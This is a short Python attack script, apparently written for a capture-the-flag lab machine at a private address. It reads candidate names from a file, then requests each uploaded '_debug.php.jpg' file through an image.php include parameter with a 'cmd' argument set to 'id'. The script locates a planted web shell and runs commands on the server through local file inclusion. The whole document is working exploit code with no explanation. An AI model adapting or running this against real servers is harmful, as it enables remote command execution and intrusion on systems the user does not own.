import requests
import os

cmd = 'id'

names_file = open("names.txt", 'r')
names = names_file.read().splitlines()

base_url = 'http://10.10.11.135/image.php?img=images/uploads/{}_debug.php.jpg&cmd={}'

for name in names:
    url = base_url.format(name, cmd)
    response = requests.get(url)
    print("{}={}".format(name, response.text))